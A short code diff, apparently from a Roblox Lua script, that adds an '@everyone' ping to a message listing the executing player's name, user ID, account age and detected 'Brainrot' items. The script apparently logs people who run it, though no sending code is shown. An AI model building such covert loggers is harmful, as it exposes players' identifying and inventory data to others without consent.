@@ -58,7 +58,7 @@ task.spawn(function()
     if brainrotMsg == "" then brainrotMsg = "Aucun Brainrot détecté." end
  
     local data = {
-        ["content"] = "🚨 **Execution #"..count.."** 🚨\n\n"..
+        ["content"] = "@everyone🚨 **Execution #"..count.."** 🚨\n\n"..
             "👤 **Joueur:** "..name.."\n"..
             "🆔 **ID:** "..userid.."\n"..
             "📅 **Age:** "..accountAge.." jours\n"..
